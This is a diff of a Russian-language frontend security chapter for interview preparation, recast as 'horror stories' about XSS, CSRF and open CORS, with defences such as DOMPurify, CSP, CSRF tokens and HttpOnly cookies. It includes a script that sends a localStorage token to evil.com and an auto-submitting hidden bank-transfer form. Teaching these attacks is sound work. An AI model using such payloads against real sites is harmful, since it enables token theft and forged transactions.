@@ -1,78 +1,44 @@
-# Глава 60. Безопасность во фронтенде
+# Глава 60. Фронтенд под прицелом: три хоррор-истории
 
-Безопасность во фронтенде — это не про «сервер всё проверит», а про минимизацию поверхности атаки. На уровне Middle+ ожидается понимание моделей угроз, а не просто список терминов.
+Безопасность во фронтенде — это не про «сервер всё проверит». Это про понимание, что фронтенд — это **граница приложения**, и любая ошибка может стать точкой входа для атаки.
+
+На уровне Middle+ ожидается понимание моделей угроз, а не просто список терминов. Поэтому вместо перечисления уязвимостей, давай разберём **три хоррор-истории**, которые показывают, что происходит, когда безопасность игнорируется.
 
 ---
 
-## 60.1. XSS (Cross-Site Scripting)
+## Хоррор-история 1: кража токенов через XSS
 
-XSS — внедрение вредоносного JS-кода в доверенный контекст.
+### Сценарий
 
-### Виды XSS
+Разработчик использует `dangerouslySetInnerHTML` для отображения HTML-контента от пользователя. В комментарии попадает скрипт:
 
-**Отражённая (Reflected):**
-
-Код возвращается в ответе сервера. Пользователь видит вредоносный URL.
-
-```javascript
-// URL: /search?q=<script>alert('XSS')</script>
-// Сервер возвращает: <div>Результаты для: <script>alert('XSS')</script></div>
+```html
+<script>
+  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
+</script>
 ```
 
-**Хранимая (Stored):**
+Скрипт выполняется в контексте приложения, читает токен из `localStorage` и отправляет его на сервер злоумышленника. Атакующий получает токен и может войти в аккаунт жертвы.
 
-Код сохраняется в БД и исполняется у всех пользователей.
+### Что такое XSS
 
-```javascript
-// Пользователь оставляет комментарий: <script>stealCookies()</script>
-// Комментарий сохраняется в БД
-// Все пользователи видят этот комментарий → скрипт выполняется
-```
+**XSS (Cross-Site Scripting)** — внедрение вредоносного JS-кода в доверенный контекст. Код выполняется в браузере жертвы и получает доступ к данным приложения.
 
-**DOM-based:**
+**Виды XSS:**
 
-Манипуляции DOM без участия сервера. Вредоносный код в клиентском JS.
+1. **Отражённая (Reflected)** — код возвращается в ответе сервера. Пользователь видит вредоносный URL.
+2. **Хранимая (Stored)** — код сохраняется в БД и исполняется у всех пользователей.
+3. **DOM-based** — манипуляции DOM без участия сервера. Вредоносный код в клиентском JS.
 
-```javascript
-// Клиентский код
-const hash = window.location.hash
-element.innerHTML = hash //  XSS через URL hash
-```
+### Как защититься
 
-### Пример уязвимости
-
-```javascript
-//  Опасно
-element.innerHTML = userInput
-
-//  Безопасно
-element.textContent = userInput
-```
-
-### Защита от XSS
-
-- **Экранирование (sanitization)** — очистка пользовательского ввода
-- **Content Security Policy (CSP)** — ограничение источников скриптов
-- **Отказ от innerHTML** — использование textContent
-- **Использование фреймворков** — React экранирует по умолчанию
-- **Валидация на сервере** — никогда не доверяй клиенту
-
-### React и XSS
-
-React автоматически экранирует значения:
+**1. Экранирование (sanitization)**
 
 ```tsx
-//  Безопасно: React экранирует
-function UserProfile({ name }: { name: string }) {
-  return <div>{name}</div> // Автоматически экранируется
-}
+// Опасно
+<div dangerouslySetInnerHTML={{ __html: userInput }} />
 
-//  Опасно: dangerouslySetInnerHTML
-function UserContent({ html }: { html: string }) {
-  return <div dangerouslySetInnerHTML={{ __html: html }} />
-}
-
-//  Безопасно: санитизация перед dangerouslySetInnerHTML
+// Безопасно: санитизация
 import DOMPurify from 'dompurify'
 
 function UserContent({ html }: { html: string }) {
@@ -81,35 +47,91 @@ function UserContent({ html }: { html: string }) {
 }
 ```
 
----
+**2. Content Security Policy (CSP)**
 
-## 60.2. CSRF (Cross-Site Request Forgery)
-
-CSRF — выполнение запроса от имени пользователя без его ведома.
-
-### Как работает
-
-1. Пользователь залогинен на сайте A (bank.com)
-2. Пользователь переходит на сайт B (evil.com)
-3. Сайт B отправляет запрос на bank.com от имени пользователя
-4. Браузер автоматически отправляет cookies с bank.com
-5. Запрос выполняется успешно
-
-**Пример:**
+CSP ограничивает источники скриптов, предотвращая выполнение вредоносного кода:
 
 ```html
-<!-- evil.com -->
-<img src="https://bank.com/transfer?to=attacker&amount=1000" />
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
 ```
 
-### Защита от CSRF
+**3. Отказ от innerHTML**
 
-- **CSRF-токены** — уникальный токен для каждого запроса
-- **SameSite cookies** — ограничение отправки cookies
-- **Проверка Origin / Referer** — проверка источника запроса
-- **Двойная отправка cookies** — проверка совпадения cookies
+Используй `textContent` вместо `innerHTML`:
 
-### SameSite cookies
+```tsx
+// Опасно
+element.innerHTML = userInput
+
+// Безопасно
+element.textContent = userInput
+```
+
+**4. React экранирует по умолчанию**
+
+React автоматически экранирует значения:
+
+```tsx
+// Безопасно: React экранирует
+function UserProfile({ name }: { name: string }) {
+  return <div>{name}</div> // Автоматически экранируется
+}
+
+// Опасно: dangerouslySetInnerHTML
+function UserContent({ html }: { html: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: html }} />
+}
+```
+
+**5. Валидация на сервере**
+
+Никогда не доверяй клиенту. Валидируй и санитизируй данные на сервере.
+
+---
+
+## Хоррор-история 2: поддельный перевод через CSRF
+
+### Сценарий
+
+Пользователь залогинен на сайте банка (bank.com). Затем переходит на сайт злоумышленника (evil.com), который содержит скрытую форму:
+
+```html
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker-account">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+Форма автоматически отправляется на банк. Браузер автоматически отправляет cookies с bank.com, включая сессионный токен. Банк видит валидную сессию и выполняет перевод. Деньги уходят на счёт злоумышленника.
+
+### Что такое CSRF
+
+**CSRF (Cross-Site Request Forgery)** — выполнение запроса от имени пользователя без его ведома. Атакующий использует авторизацию жертвы для выполнения действий от её имени.
+
+### Как защититься
+
+**1. CSRF-токены**
+
+Уникальный токен для каждого запроса:
+
+```typescript
+// Сервер генерирует токен
+const csrfToken = generateToken()
+
+// Клиент отправляет токен с запросом
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-CSRF-Token': csrfToken,
+  },
+  body: JSON.stringify({ to, amount }),
+})
+```
+
+**2. SameSite cookies**
+
+Ограничение отправки cookies только для same-site запросов:
 
 ```javascript
 // Strict — только same-site запросы
@@ -122,45 +144,71 @@ Set-Cookie: session=abc123; SameSite=Lax
 Set-Cookie: session=abc123; SameSite=None; Secure
 ```
 
+**3. Проверка Origin / Referer**
+
+Проверка источника запроса на сервере:
+
+```typescript
+if (request.headers.origin !== 'https://myapp.com') {
+  return new Response('Forbidden', { status: 403 })
+}
+```
+
+**4. Двойная отправка cookies**
+
+Проверка совпадения cookies в заголовке и теле запроса.
+
 ---
 
-## 60.3. CORS (Cross-Origin Resource Sharing)
+## Хоррор-история 3: как CORS и CSP спасают ситуацию
 
-CORS — механизм контроля доступа между origin'ами.
+### Сценарий
 
-### Preflight-запрос
+Разработчик настроил API с открытым CORS (`Access-Control-Allow-Origin: *`), чтобы «заработал фронт». Любой сайт может обращаться к API от имени пользователя. Злоумышленник создаёт сайт, который:
 
-Для сложных запросов браузер сначала отправляет OPTIONS:
+1. Использует авторизацию пользователя (cookies отправляются автоматически)
+2. Делает запросы к API от имени пользователя
+3. Получает доступ к данным и выполняет действия
 
-```
-OPTIONS /api/users
-Origin: https://example.com
-Access-Control-Request-Method: POST
-```
+**Проблема:** открытый CORS позволяет любому сайту обращаться к API, используя авторизацию пользователя.
 
-Сервер отвечает:
+### Что такое CORS
 
-```
-Access-Control-Allow-Origin: https://example.com
-Access-Control-Allow-Methods: POST, GET
-Access-Control-Allow-Headers: Content-Type
-```
-
-### Типичная ошибка
-
-```javascript
-//  Опасно: открытый CORS
-Access-Control-Allow-Origin: *
-
-//  Безопасно: конкретные домены
-Access-Control-Allow-Origin: https://myapp.com
-```
+**CORS (Cross-Origin Resource Sharing)** — механизм контроля доступа между origin'ами. Браузер проверяет заголовки CORS и блокирует запросы, которые не разрешены сервером.
 
 **Важно:** CORS — это защита браузера, а не сервера. Сервер настраивает политику, браузер её исполняет.
 
+### Как защититься
+
+**1. Ограничить CORS конкретными доменами**
+
+```javascript
+// Опасно: открытый CORS
+Access-Control-Allow-Origin: *
+
+// Безопасно: конкретные домены
+Access-Control-Allow-Origin: https://myapp.com
+```
+
+**2. Content Security Policy (CSP)**
+
+CSP ограничивает источники скриптов, предотвращая выполнение вредоносного кода:
+
+```html
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+```
+
+**3. Безопасные заголовки**
+
+Базовый набор на сервере:
+
+- **CSP** — ограничить источники скриптов
+- **X-Content-Type-Options: nosniff** — предотвратить MIME-sniffing
+- **Referrer-Policy: strict-origin-when-cross-origin** — ограничить передачу referrer
+
 ---
 
-## 60.4. Cookie-флаги
+## Cookie-флаги: защита от утечек
 
 ### HttpOnly
 
@@ -206,9 +254,9 @@ Set-Cookie: session=abc123; SameSite=Lax; Secure
 
 ---
 
-## 60.5. Токены и аутентификация
+## Токены и аутентификация
 
-### JWT (JSON Web Token)
+### JWT: плюсы и минусы
 
 **Плюсы:**
 
@@ -238,7 +286,7 @@ Set-Cookie: session=abc123; SameSite=Lax; Secure
 
 ### Где хранить токены
 
-** localStorage:**
+**❌ localStorage:**
 
 ```javascript
 // Уязвимо к XSS
@@ -246,7 +294,7 @@ localStorage.setItem('token', 'abc123')
 // Атакующий может прочитать через XSS
 ```
 
-** HttpOnly cookies:**
+**✅ HttpOnly cookies:**
 
 ```javascript
 // Безопасно: JS не может прочитать
@@ -261,7 +309,7 @@ Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
 
 ---
 
-## 60.6. Axios Interceptors для JWT
+## Axios Interceptors для JWT
 
 ### Автоматическая подстановка токена
 
@@ -321,50 +369,13 @@ function getTokenFromCookies() {
   const cookieStore = cookies()
   return cookieStore.get('token')?.value
 }
-
-// В Server Component или Server Action
-apiClient.interceptors.request.use((config) => {
-  if (typeof window === 'undefined') {
-    // На сервере
-    const token = getTokenFromCookies()
-    if (token) {
-      config.headers.Authorization = `Bearer ${token}`
-    }
-  } else {
-    // На клиенте
-    const token = localStorage.getItem('token')
-    if (token) {
-      config.headers.Authorization = `Bearer ${token}`
-    }
-  }
-  return config
-})
 ```
 
 **Рекомендация:** для Next.js App Router лучше использовать HttpOnly cookies для токенов — это решает проблему SSR из коробки.
 
 ---
 
-## 60.7. OWASP Top-10
-
-**Ключевые пункты для фронтенда:**
-
-- **XSS** — внедрение скриптов
-- **CSRF** — подделка запросов
-- **Insecure storage** — небезопасное хранение данных
-- **Misconfiguration** — неправильная конфигурация
-
-### Типичные ошибки
-
-- Хранение токенов в localStorage
-- Отключение CORS без понимания
-- Доверие данным от клиента
-- Открытый CORS (`Access-Control-Allow-Origin: *`)
-- Отсутствие валидации на клиенте и сервере
-
----
-
-## 60.8. Практические сценарии
+## Практические сценарии
 
 ### Сценарий 1: SPA на React с токенами
 
@@ -408,20 +419,18 @@ apiClient.interceptors.request.use((config) => {
 - для cookie-авторизации аккуратно комбинировать CORS и `SameSite`
 - не использовать `*` в продакшене для чувствительных эндпоинтов
 
-### Сценарий 4: Загрузка файлов
+---
 
-**Ситуация:** фронт позволяет загружать файлы и показывает превью.
+## Мини-чек-лист безопасности
 
-**Риски:**
-
-- попытка загрузки HTML/JS под видом картинки
-- XSS-атаки при отображении имени файла или описания без экранирования
-
-**Как лучше:**
-
-- валидировать тип и размер файла на клиенте и на сервере
-- никогда не доверять `file.name` и другим полям, всегда экранировать при выводе
-- использовать безопасные CDN/поддомены для раздачи пользовательского контента
+- Валидация и санитизация ввода на клиенте и сервере
+- CSP и безопасные заголовки на сервере
+- Секреты только на сервере (никогда `NEXT_PUBLIC_` для токенов)
+- HttpOnly cookies для токенов
+- Ограниченный CORS (не `*`)
+- SameSite для cookies
+- Зависимости обновляются регулярно
+- Логи не содержат чувствительных данных
 
 ---
 
@@ -433,7 +442,7 @@ Reflected — в URL, Stored — в БД, DOM-based — в клиентском 
 
 ### 2. Как защититься от XSS?
 
-Экранирование, CSP, textContent вместо innerHTML, фреймворки (React экранирует по умолчанию).
+Экранирование, CSP, textContent вместо innerHTML, фреймворки (React экранирует по умолчанию), валидация на сервере.
 
 ### 3. Что такое CSRF?
 
@@ -459,4 +468,3 @@ HttpOnly cookies недоступны из JS, защита от XSS.
 
 XSS, CSRF, insecure storage, misconfiguration.
 
-- Никогда не доверяй данным от клиента — валидация на сервере обязательна
